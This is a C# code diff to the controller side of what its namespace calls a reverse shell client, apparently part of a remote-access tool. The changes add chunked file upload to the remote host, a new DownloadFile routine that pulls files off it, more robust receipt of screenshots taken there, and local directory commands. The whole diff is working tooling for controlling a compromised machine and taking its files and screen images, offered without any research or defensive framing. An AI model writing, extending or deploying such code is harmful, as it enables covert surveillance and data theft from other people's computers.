@@ -22,20 +22,24 @@ namespace ReverseShellClient
         }
 
 
-        public void UploadFile(string fileLocation)
+        public void UploadFile(string path)
         {
-            using (var readStream = new FileStream(fileLocation, FileMode.Open))
-            {
-                // Send the data length first
-                bw.Write((int)new FileInfo(fileLocation).Length);
-                bw.Flush();
+            ConsoleColorTools.WriteCommandMessage("Starting upload of file '" + path + "' to the server");
 
-                var buffer = new byte[1];
-                while (readStream.Read(buffer, 0, 1) > 0)
+            // Send the data length first
+            bw.Write((int)new FileInfo(path).Length);
+            bw.Flush();
+
+            using (var readStream = new FileStream(path, FileMode.Open))
+            {
+                var buffer = new byte[4096];
+                int bytesRead;
+                while ((bytesRead = readStream.Read(buffer, 0, buffer.Length)) > 0)
                 {
-                    bw.Write(buffer[0]);
-                    bw.Flush();
+                    bw.Write(buffer, 0, bytesRead);
                 }
+
+                bw.Flush();
             }
 
             var result = sr.ReadLine();
@@ -51,9 +55,46 @@ namespace ReverseShellClient
         }
 
 
-        public void ReceiveFile(string newFileLocation)
+        public void DownloadFile(string path)
         {
+            if (sr.ReadLine() == "false")
+            {
+                ConsoleColorTools.WriteCommandError("The specified file doesn't exist");
+                return;
+            }
 
+            ConsoleColorTools.WriteCommandMessage("Starting download of file '" + path + "' from the server");
+
+            var dataLength = br.ReadInt32();
+
+            try
+            {
+                using (var fs = new FileStream(path, FileMode.Create))
+                {
+                    var buffer = new byte[4096];
+                    int bytesRead;
+                    var bytesWritten = 0;
+                    while ((bytesRead = br.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        fs.Write(buffer, 0, bytesRead);
+                        bytesWritten += bytesRead;
+
+                        // The file has been totally written
+                        if (bytesWritten == dataLength)
+                        {
+                            break;
+                        }
+                    }
+                }
+
+                ConsoleColorTools.WriteCommandSuccess("File successfully downloaded from the server");
+            }
+            catch (Exception)
+            {
+                // Delete the partially created file
+                File.Delete(path);
+                ConsoleColorTools.WriteCommandError("An error occured");
+            }
         }
 
 
@@ -67,18 +108,12 @@ namespace ReverseShellClient
             else
             {
                 var error = result.Split(':')[1];
-                if (error == "IO")
-                {
-                    error = "can't write here (IO)";
-                }
-                else
-                {
-                    error = "network error";
-                }
+                error = error == "IO" ? "can't write here (IO)" : "network error";
 
                 ConsoleColorTools.WriteCommandError("An error occured : " + error);
             }
         }
+
 
         public void ReceiveScreenShot()
         {
@@ -91,31 +126,74 @@ namespace ReverseShellClient
             // Get data length
             var dataLength = br.ReadInt32();
 
-            using (var fs = new FileStream(fileName, FileMode.Create))
+            try
             {
-                // Read all the data
-                var buffer = new byte[1];
-                for (int i = 0; i < dataLength; i++)
+                using (var fs = new FileStream(fileName, FileMode.Create))
                 {
-                    br.Read(buffer, 0, 1);
-                    fs.Write(buffer, 0, 1);
+                    var buffer = new byte[4096];
+                    int bytesRead;
+                    var bytesWritten = 0;
+                    while ((bytesRead = br.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        fs.Write(buffer, 0, bytesRead);
+                        bytesWritten += bytesRead;
+
+                        // The file has been totally written
+                        if (bytesWritten == dataLength)
+                        {
+                            break;
+                        }
+                    }
                 }
+
+                ConsoleColorTools.WriteCommandSuccess("Screenshot saved : " + fileName);
             }
-
-            ConsoleColorTools.WriteCommandSuccess("Screenshot saved : " + fileName);
-        }
-
-        public bool CheckForFileExist(string path, bool local)
-        {
-            if (local)
+            catch (Exception)
             {
-                return File.Exists(path);
+                // Delete the partially created file
+                File.Delete(fileName);
+                ConsoleColorTools.WriteCommandError("An error occured");
+            }
+        }
+
+
+        public void lcwd()
+        {
+            Console.WriteLine("Local cwd : '{0}'", Directory.GetCurrentDirectory());
+        }
+
+        public void lls()
+        {
+            var cwd = Directory.GetCurrentDirectory();
+
+            foreach (var directory in Directory.GetDirectories(cwd))
+            {
+                var formattedDirectory = directory.Substring(directory.LastIndexOf('\\') + 1);
+                Console.WriteLine("  <DIR>   {0}", formattedDirectory);
             }
 
-            sw.WriteLine("#fileexist " + path);
-            sw.Flush();
-            return sr.ReadLine() == "true";
+            foreach (var file in Directory.GetFiles(cwd))
+            {
+                var formattedFile = file.Substring(file.LastIndexOf('\\') + 1);
+                Console.WriteLine("          {0}", formattedFile);
+            }
         }
+        
+        public void lcd(string argument)
+        {
+            var path = Path.Combine(Directory.GetCurrentDirectory(), argument);
+            if (Directory.Exists(path))
+            {
+                Directory.SetCurrentDirectory(path);
+                // Display new local cwd
+                lcwd();
+            }
+            else
+            {
+                Console.WriteLine("No such directory");
+            }
+        }
+
         
         public void SayHello()
         {
